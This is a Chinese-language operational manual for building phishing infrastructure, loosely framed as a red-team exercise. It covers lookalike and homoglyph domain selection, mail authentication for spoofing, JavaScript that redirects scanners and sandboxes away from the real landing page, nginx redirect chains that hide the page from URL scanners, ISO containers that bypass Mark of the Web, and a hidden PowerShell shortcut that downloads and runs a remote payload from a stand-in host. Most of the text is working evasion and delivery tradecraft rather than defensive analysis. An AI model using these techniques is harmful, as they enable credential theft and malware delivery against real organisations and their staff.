# 钓鱼基础设施实操手册

搭一套能过 SEG 的钓鱼设施，难点不在技术，在**信誉**。
代码层面的东西（反代、落地页）任何人都能写，但新域名 + 新 IP + 无邮件认证
= 还没投递就被拦。这份文档讲的都是「信誉」这块。

---

## 一、域名：为什么新注册的几乎必被拦

### 判据

| 检查项 | 低于这个值 | 后果 |
| --- | --- | --- |
| 域名年龄 | < 30 天 | SEG 直接打「新注册域名」标签，多数策略直接隔离 |
| 域名历史 | 曾被用于垃圾/钓鱼 | 永久黑名单（Spamhaus / SURBL 等），无法洗白 |
| DNS 记录完整度 | 无 MX / 无 SPF / 无 A | 「空壳域名」特征，高度可疑 |
| WHOIS 隐私保护 | 全部隐藏 | 现代化 SEG 会扣分（但个人注册几乎无法避免） |

**结论**：理想的钓鱼域名是「注册 3 个月以上、有正常网站、有 MX 记录」的域名 ——
但它要么是买的（贵），要么是提前养的（周期长）。一次性演练里这点常做不到，
所以**必须准备「域名被拦」之后的第二方案**（见第五节的通道切换）。

### 实操检查

```bash
DOMAIN="target-secure.com"

# 1) 年龄（creation date 是关键判断）
whois "$DOMAIN" | grep -iE "creation date|created"

# 2) 是否在 Spamhaus DBL（域名黑名单）
dig +short "$DOMAIN.dbl.spamhaus.org" A
#    返回 127.0.1.x 系列 = 已列入；无返回 = 干净

# 3) 是否在 SURBL
dig +short "$DOMAIN.multi.surbl.org" A

# 4) 威胁情报快速查（免费额度够用）
curl -s "https://urlhaus-api.abuse.ch/v1/host/" -d "host=$DOMAIN" | head -c 300

# 5) DNS 记录是否完整（空壳域名是红旗）
dig +short A "$DOMAIN"; dig +short MX "$DOMAIN"; dig +short TXT "$DOMAIN"
```

**判据**：2、3 任一回 127.0.1.x → **弃用这个域名**，不要试（投一次就被记住，白训练对方）。

---

## 二、邮件认证：SPF / DKIM / DMARC 三件套

这是「能不能伪造发件人」的核心。**先判断目标自己的部署情况**（见
`references/email-auth-checklist.md`），再决定走哪条路。

### 三条路，按成功率排序

#### 路 1：注册一个「看起来像目标」的独立域名（最常用）

```text
自己的域名，自己配 SPF/DKIM/DMARC → 认证全过
但域名本身是新的 → 撞第一节的「新域名」判据
所以这条路的成败在域名年龄，不在认证配置
```

```bash
# 自建发信（Postfix 最小配置要点）
# 1) 反向解析（PTR）：VPS 提供商后台设 rDNS 指向你的域名 —— 绝大多数 VPS 支持
# 2) SPF：只允许自己的 IP
echo "v=spf1 ip4:<VPS_IP> -all" >> /etc/postfix/spf.txt
# 3) DKIM：用 opendkim 生成密钥，公钥发到 DNS
opendkim-genkey -s mail -d your-domain.com
cat mail.txt   # 把这行 TXT 记录加到 DNS
# 4) DMARC：先设 none（观察），别设 reject（会拒掉自己的信）
echo "v=DMARC1; p=none; rua=mailto:dmarc@your-domain.com" > /etc/postfix/dmarc.txt
```

#### 路 2：用目标的相似域名（typosquat）

```text
target.com → target-cn.com / target.com.cn / target-secure.com / target.co
判据：看目标自己有没有注册防御性域名（大厂通常注册了几十个）
检查：whois 上面这些候选，已被注册 = 有人防过了，换下一个模式
```

**常见 typosquat 模式**（按检出率从低到高，越往后越容易被拦）：

| 模式 | 示例 | 检出率 |
|---|---|---|
| 加连字符 | target-secure.com | 中（常见，检测规则覆盖全） |
| 换 TLD | target.com.co / target.net | 中 |
| 加国家后缀 | target.com.cn | 低（看起来像正经分支） |
| 同形字（homoglyph） | targеt.com（е 是西里尔字母） | **极低**（但要注册 punycode 域名，部分邮件客户端会显示警告） |
| 加子域式前缀 | target.login-secure.com | 低 |
| 拼写错误 | targte.com / targat.com | 高（检测规则专门盯这个） |

#### 路 3：直接发信 + 伪造 From（成功率最低，但零成本）

```text
不配任何认证，From 直接写 target.com 的地址
现代 SEG 几乎全拦（DMARC 普及后这条路基本废了）
唯一还有效的场景：目标自己没配 DMARC（用 email-auth-checklist 先查）
```

```bash
# 快速判断目标有没有 DMARC（决定路 3 通不通）
dig +short TXT _dmarc.target.com
# 无返回 = 没配 DMARC → 伪造 From 可能可行
# 返回 "v=DMARC1; p=none" = 有但只是观察 → 可能可行
# 返回 "v=DMARC1; p=reject" = 强制拒收 → 这条路死了
```

---

## 三、落地页：怎么让扫描器看不到真身

邮件网关会把链接点开扫一遍（URL detonation）。你的落地页必须能区分
「扫描器」和「真人」，否则真人还没看到，页面已经被判定为钓鱼。

### 环境检查（按命中率排序，都是真在用的判据）

```javascript
// 1) 无头浏览器特征（扫描器几乎全用 headless Chrome）
if (navigator.webdriver) { location.href = "https://target.com"; }

// 2) 窗口尺寸异常（沙箱常是 800x600 或固定尺寸）
if (screen.width < 1000 || screen.height < 700) { location.href = "https://target.com"; }

// 3) 时区/语言与目标地区不符（沙箱多在 UTC + en-US）
const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
if (!tz.startsWith("Asia/Shanghai")) { location.href = "https://target.com"; }

// 4) WebGL 渲染器（无头环境常是 SwiftShader 或缺失）
const gl = document.createElement("canvas").getContext("webgl");
const ext = gl && gl.getExtension("WEBGL_debug_renderer_info");
if (!ext || /SwiftShader|llvmpipe/i.test(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL))) {
  location.href = "https://target.com";
}

// 5) 鼠标/触摸事件缺失（真人有，扫描器没有）
let moved = false;
document.addEventListener("mousemove", () => { moved = true; });
setTimeout(() => { if (!moved) { location.href = "https://target.com"; } }, 5000);
```

### 302 跳板（让扫描器跟丢）

```nginx
# 扫描器通常只跟随 1-2 跳
location = /r {
    # 第一跳：看起来指向合法服务（Google/Notion），扫描器跟到这里就停
    return 302 https://docs.google.com/document/d/$RANDOM;
}
location = /real {
    # 真实落地页，只有带正确参数 + 通过环境检查才会渲染
    if ($arg_k != "你的密钥") { return 302 https://target.com; }
    root /var/www/phish;
}
```

**判据**：扫描器「跟丢」的唯一可靠验证方式是**自己用 URLScan / 沙箱复现一次**：
提交你的链接到 `urlscan.io`（公开扫描），看它扫到的是不是你想要的页面。
扫到「正常页」= 环境检查生效；扫到落地页 = 会被拦。

---

## 四、载荷：按「过网关」的档位选

### 档位表

| 档 | 形态 | 过静态扫描 | 过沙箱 | 检出率 | 什么时候用 |
| --- | --- | --- | --- | --- | --- |
| 1 | 纯链接 | ✓ | ✓ | 高 | 只测「用户会不会点」，不测终端 |
| 2 | 跳板 302 | ✓ | 中 | 中 | 网关会做 URL 扫描时 |
| 3 | HTML Smuggling | ✓ | 低 | 中 | 附件全被拦时 |
| 4 | ISO/IMG 容器 | ✓ | 低 | 中 | 绕 MOTW（Mark of the Web） |
| 5 | LNK + 延迟执行 | ✓ | **✓** | 低 | 目标有沙箱且沙箱观察时间短 |

### ISO/IMG 为什么能绕 MOTW

```text
Windows 给「来自 Internet 的文件」打 Zone.Identifier 标记（MOTW），
Office/可执行文件带 MOTW 时会进受保护视图或直接拦。
ISO/IMG 挂载后的内部文件 **不带 MOTW**（这是设计缺陷，微软未完全修复）。
所以：把 .lnk 或 .exe 塞进 ISO → 用户挂载 → 双击 → 无警告执行。
```

```bash
# Linux 上做 ISO（genisoimage 或 mkisofs）
mkdir -p /tmp/payload
cp evil.lnk /tmp/payload/报表.lnk
genisoimage -o 报表.iso -V "Q4Report" -J -r /tmp/payload/
# 判据：挂载后文件不带 Zone.Identifier
```

### LNK 的最小构造

```powershell
# 用 WScript.Shell 造一个指向 powershell 的 LNK
$ws = New-Object -ComObject WScript.Shell
$lnk = $ws.CreateShortcut("C:\tmp\报表.lnk")
$lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$lnk.Arguments = "-nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://vps/a')\`""
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,70"   # 伪装成 PDF 图标
$lnk.Save()
```

**验伤**：LNK 双击后必须**真的执行**且不弹 UAC。
「图标变了」不代表能跑 —— 必须实机双击一次。常见失败：参数里的引号被 LNK 吃掉、
`-w hidden` 在部分 Windows 版本上无效、Defender 对「LNK 起 powershell」有专门规则。

---

## 五、通道切换（域名/邮件全被拦时的出口）

按「绕开邮件网关」排序：

| 通道 | 怎么用 | 优点 | 缺点 |
| --- | --- | --- | --- |
| **内部邮箱** | 先拿到一个员工邮箱，用它发内邮 | 内部域信誉极高，SEG 常放行 | 需要先有一次成功 |
| **短信** | 短信网关（Twilio/云片）或伪基站 | 完全绕开邮件网关 | 覆盖面小，需手机号 |
| **IM（企业微信/钉钉/飞书）** | 伪造外部联系人 / 群邀请 | 目标组织内已信任该通道 | 需知道内部组织结构 |
| **OAuth 同意** | 发一个「应用授权」链接 | 页面是真实微软/谷歌页，与网关无关 | 需注册应用（留痕） |
| **电话 pretext** | 冒充 IT 支持 / 供应商 | 绕开所有技术防护 | 需要人（不是自动化） |
| **合法云服务承载** | Google Docs / Notion / Dropbox 放诱导内容 | 域名信誉极高 | 内容会被云厂商扫描 |

**纪律**：从第 1 档往下一档，**每次都记录「上一档为什么失败」** ——
这是报告里「哪一层防护生效了」的唯一证据来源。

---

## 六、常见坑（每一条都是实战踩过的）

1. **新域名直接投递** —— 100% 被拦，白浪费一轮，还给对方 SOAR 留了样本。
2. **DMARC 设 reject 自己的信** —— 配 DMARC 时手一抖设成 `p=reject`，自己的邮件被自己的策略拒了。
   先 `p=none` 观察。
3. **落地页不放环境检查** —— 网关扫一遍就把你的页面截图存进威胁情报库了。
4. **AiTM 拿 cookie 就宣布成功** —— 必须真用 cookie 打开目标页面看到数据。见
   `references/oauth-consent-abuse.md` 里的同类判据。
5. **同一批人连发三轮** —— 第一轮测试、第二轮骚扰、第三轮事故。
6. **在钓鱼页放真登录框直连生产 SSO** —— 凭据会被真实记录。必须用自制页面，
   且**提交的凭据不落盘**（演练只统计「有人提交了」，不存内容）。
7. **载荷投第二次** —— Defender 第一次可能放过，第二次必然拉黑（第一次的行为已进云端）。
8. **不测「对方多久发现」** —— 演练的核心交付是「防护有效性 + 检测时效」，
   不是「骗到几个人」。这一点没测等于白做。